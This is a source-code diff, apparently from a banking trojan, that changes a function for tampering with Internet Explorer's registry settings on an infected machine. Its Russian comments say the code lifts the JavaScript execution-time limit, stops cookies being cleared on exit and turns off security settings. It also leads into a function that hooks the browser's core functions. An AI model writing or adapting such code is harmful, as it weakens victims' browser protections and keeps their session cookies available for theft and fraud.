@@ -1381,13 +1381,25 @@ void IEClearCache()
 
 void UpdateIERegistry()
 {
-	PCHAR RegPathPrivacy = "Software\\Microsoft\\Internet Explorer\\Privacy";
+	string IEPath = "Software\\Microsoft\\Internet Explorer\\";
 
-	PCHAR ParamCleanCookies = "CleanCookies";
+	const static char* RegPathMaxScriptStatements = "Styles";
+	const static char* RegPathPrivacy = "Privacy";
+
+	const static char* ParamCleanCookies        = "CleanCookies";
+	const static char* ParamMaxScriptStatements = "MaxScriptStatements";
 
 
-    // Отключаем очистку куков по выходу из ИЕ
-	Registry::SetValueDWORD(HKEY_CURRENT_USER, RegPathPrivacy, ParamCleanCookies, 0);
+	// Убиваем ограничение на максимальное время выполнения ява скриптов
+	string Path = IEPath + RegPathMaxScriptStatements;
+	Registry::CreateKey(HKEY_CURRENT_USER, IEPath.t_str(), (PCHAR)RegPathMaxScriptStatements);
+	Registry::SetValueDWORD(HKEY_CURRENT_USER, Path.t_str(), (PCHAR)ParamMaxScriptStatements, 0xFFFFFFFF);
+
+
+	// Отключаем очистку куков по выходу из ИЕ
+	Path = IEPath + RegPathPrivacy;
+	Registry::SetValueDWORD(HKEY_CURRENT_USER, Path.t_str(), (PCHAR)ParamCleanCookies, 0);
+
 
 
 	// Отключаем настройки безопасности
@@ -1414,6 +1426,7 @@ void UpdateIERegistry()
 		STR::Free(Path);
 	}
 }
+
 
 bool HookInternetExplorer() {
 	// функция вешает хуки на базовые функции которые использует
